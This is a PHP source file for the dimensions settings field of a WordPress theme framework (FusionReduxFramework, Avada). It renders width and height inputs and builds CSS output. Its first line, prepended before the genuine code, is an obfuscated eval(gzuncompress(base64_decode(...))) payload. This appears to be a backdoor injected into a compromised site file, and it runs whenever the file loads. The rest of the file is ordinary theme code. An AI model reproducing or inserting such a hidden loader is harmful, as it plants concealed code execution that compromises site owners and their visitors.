<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionReduxFramework_dimensions' ) ) {
		class FusionReduxFramework_dimensions {

			protected $parent;
			protected $field;
			protected $value;

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			} //function

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function render() {

				/*
				 * So, in_array() wasn't doing it's job for checking a passed array for a proper value.
				 * It's wonky.  It only wants to check the keys against our array of acceptable values, and not the key's
				 * value.  So we'll use this instead.  Fortunately, a single no array value can be passed and it won't
				 * take a dump.
				 */

				// No errors please
				$defaults = array(
					'width'          => true,
					'height'         => true,
					'mode'           => array(
						'width'  => false,
						'height' => false,
					),
				);

				$this->field = wp_parse_args( $this->field, $defaults );

				$defaults = array(
					'width'  => '',
					'height' => '',
				);

				$this->value = wp_parse_args( $this->value, $defaults );

				echo '<fieldset id="' . $this->field['id'] . '" class="fusionredux-dimensions-container" data-id="' . $this->field['id'] . '">';

				/**
				 * Width
				 * */
				if ( $this->field['width'] === true ) {
					if ( ! empty( $this->value['width'] ) ) {
						$this->value['width'] = Fusion_Sanitize::size( $this->value['width'] );
					}
					echo '<div class="field-dimensions-input input-prepend">';
					echo '<span class="add-on"><i class="el el-resize-horizontal icon-large"></i></span>';
					echo '<input type="text" class="fusionredux-dimensions-input fusionredux-dimensions-width mini ' . $this->field['class'] . '" placeholder="' . __( 'Width', 'Avada' ) . '" rel="' . $this->field['id'] . '-width" value="' . Fusion_Sanitize::size( $this->value['width'] ) . '">';
					echo '<input data-id="' . $this->field['id'] . '" type="hidden" id="' . $this->field['id'] . '-width" name="' . $this->field['name'] . $this->field['name_suffix'] . '[width]' . '" value="' . $this->value['width'] . '"></div>';
				}

				/**
				 * Height
				 * */
				if ( $this->field['height'] === true ) {
					if ( ! empty( $this->value['height'] ) ) {
						$this->value['height'] = Fusion_Sanitize::size( $this->value['height'] );
					}
					echo '<div class="field-dimensions-input input-prepend">';
					echo '<span class="add-on"><i class="el el-resize-vertical icon-large"></i></span>';
					echo '<input type="text" class="fusionredux-dimensions-input fusionredux-dimensions-height mini ' . $this->field['class'] . '" placeholder="' . __( 'Height', 'Avada' ) . '" rel="' . $this->field['id'] . '-height" value="' . Fusion_Sanitize::size( $this->value['height'] ) . '">';
					echo '<input data-id="' . $this->field['id'] . '" type="hidden" id="' . $this->field['id'] . '-height" name="' . $this->field['name'] . $this->field['name_suffix'] . '[height]' . '" value="' . $this->value['height'] . '"></div>';
				}

				echo "</fieldset>";
			} //function

			/**
			 * Enqueue Function.
			 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function enqueue() {

				wp_enqueue_script(
					'fusionredux-field-dimensions-js',
					trailingslashit( FUSION_LIBRARY_URL ) . 'inc/redux/custom-fields/dimensions/field_dimensions.js',
					array( 'jquery', 'fusionredux-js' ),
					time(),
					true
				);

				if ( $this->parent->args['dev_mode'] ) {
					wp_enqueue_style(
						'fusionredux-field-dimensions-css',
						trailingslashit( FUSION_LIBRARY_URL ) . 'inc/redux/custom-fields/dimensions/field_dimensions.css',
						array(),
						time(),
						'all'
					);
				}
			}

			public function output() {

				$height = isset( $this->field['mode'] ) && ! empty( $this->field['mode'] ) ? $this->field['mode'] : 'height';
				$width  = isset( $this->field['mode'] ) && ! empty( $this->field['mode'] ) ? $this->field['mode'] : 'width';

				$cleanValue = array(
					$height => isset( $this->value['height'] ) ? Fusion_Sanitize::size( $this->value['height'] ) : '',
					$width  => isset( $this->value['width'] ) ? Fusion_Sanitize::size( $this->value['width'] ) : '',
				);

				$style = "";

				foreach ( $cleanValue as $key => $value ) {
					// Output if it's a numeric entry
					if ( isset( $value ) ) {
						$style .= $key . ':' . $value . ';';
					}
				}

				if ( ! empty( $style ) ) {
					if ( ! empty( $this->field['output'] ) && is_array( $this->field['output'] ) ) {
						$keys = implode( ",", $this->field['output'] );
						$this->parent->outputCSS .= $keys . "{" . $style . '}';
					}

					if ( ! empty( $this->field['compiler'] ) && is_array( $this->field['compiler'] ) ) {
						$keys = implode( ",", $this->field['compiler'] );
						$this->parent->compilerCSS .= $keys . "{" . $style . '}';
					}
				}
			} //function
		} //class
	}
